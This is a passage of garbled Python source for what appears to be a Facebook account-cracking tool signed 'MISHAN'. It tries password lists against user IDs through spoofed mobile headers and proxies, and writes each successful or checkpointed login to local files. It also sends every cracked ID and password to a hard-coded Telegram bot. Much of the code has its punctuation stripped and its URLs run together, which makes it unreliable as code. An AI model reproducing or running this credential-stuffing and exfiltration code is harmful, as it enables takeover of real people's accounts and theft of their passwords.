	sys.stdout.write(fr {P}[MISHAN-DW]{P} {P}{loop}{P}{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{.0%}'.format(loopfloat(len(id)))}{P}]  ),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv
		try
			ses.headers.update({Hostp.facebook.com,'cache-control' 'max-age=0','sec-ch-ua-mobile' '1',upgrade-insecure-requests1,user-agentua,accepttexthtml,applicationxhtml+xml,applicationxml;q=0.9,imageavif,imagewebp,imageapng,[inserted by cython to avoid comment closer][inserted by cython to avoid comment start];q=0.8,applicationsigned-exchange;v=b3;q=0.9,dnt1,x-requested-withmark.via.gp,sec-fetch-sitesame-origin,sec-fetch-modecors,sec-fetch-destempty,sec-fetch-destdocument,refererhttpsp.facebook.com,accept-encodinggzip, deflate br,accept-languageid-ID,id;q=0.9,en-US;q=0.8,en;q=0.7})
			p = ses.get('httpsp.facebook.comlogindevice-basedvalidate-passwordshbl=0',data=dataa,cookies={'cookie' koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={lsdre.search('name=lsd value=(.)', str(p.text)).group(1),jazoestre.search('name=jazoest value=(.)', str(p.text)).group(1),uididf,nexthttpsp.facebook.comloginsave-device,flowlogin_no_pin,passpw,}
			koki = (;).join([ %s=%s % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={Hostp.facebook.com,cache-controlmax-age=0,upgrade-insecure-requests1,originhttpsp.facebook.com,content-typeapplicationx-www-form-urlencoded,user-agentMozilla5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit537.36 (KHTML, like Gecko) SamsungBrowser16.0 Chrome92.0.4515.166 Mobile Safari537.36,accepttexthtml,applicationxhtml+xml,applicationxml;q=0.9,imageavif,imagewebp,imageapng,[inserted by cython to avoid comment closer][inserted by cython to avoid comment start];q=0.8,applicationsigned-exchange;v=b3;q=0.9,x-requested-withmark.via.gp,sec-fetch-sitesame-origin,sec-fetch-modecors,sec-fetch-userempty,sec-fetch-destdocument,refererhttpsp.facebook.comindex.phpnext=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F,accept-encodinggzip, deflate br,accept-languageid-ID,id;q=0.9,en-US;q=0.8,en;q=0.7}
			po = ses.post('httpsp.facebook.comlogindevice-basedvalidate-passwordshbl=0',data=dataa,cookies={'cookie' koki},headers=heade,allow_redirects=False,proxies=proxs)
			if checkpoint in po.cookies.get_dict().keys()
				print(f'r{P}{K} [{time.strftime(%H%M)}-CP] {idf} │ {pw} {P}')
				open('CP'+cpc,'a').write(idf+''+pw+'n')
				akun.append(idf+''+pw)
				cp+=1
				break
			elif c_user in ses.cookies.get_dict().keys()
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (;).join([ %s=%s % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'r{P}{H} [{time.strftime(%H%M)}-OK] {idf} │ {pw} {P}')
				open('OK'+okc,'a').write(idf+''+pw+'n')
				cek_apk(session,coki)
				requests.get(httpsapi.telegram.orgbot6143260559AAEAPrCMNwHH9Dllv-vJHIc1snwdrK4r7PwsendMessagechat_id=+tid+&text=+uname+n[ +idf+'  '+pw+  ])
				ok.append(wrt)
				break
			else
				continue
		except requests.exceptions.ConnectionError
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__'
	tryos.mkdir('OK')
	exceptpass
	tryos.mkdir('CP')
	exceptpass
	tryos.system('touch .prox.txt')
	exceptpass
	login()


#LOTS OF LOVE FROM MISHAN 🌺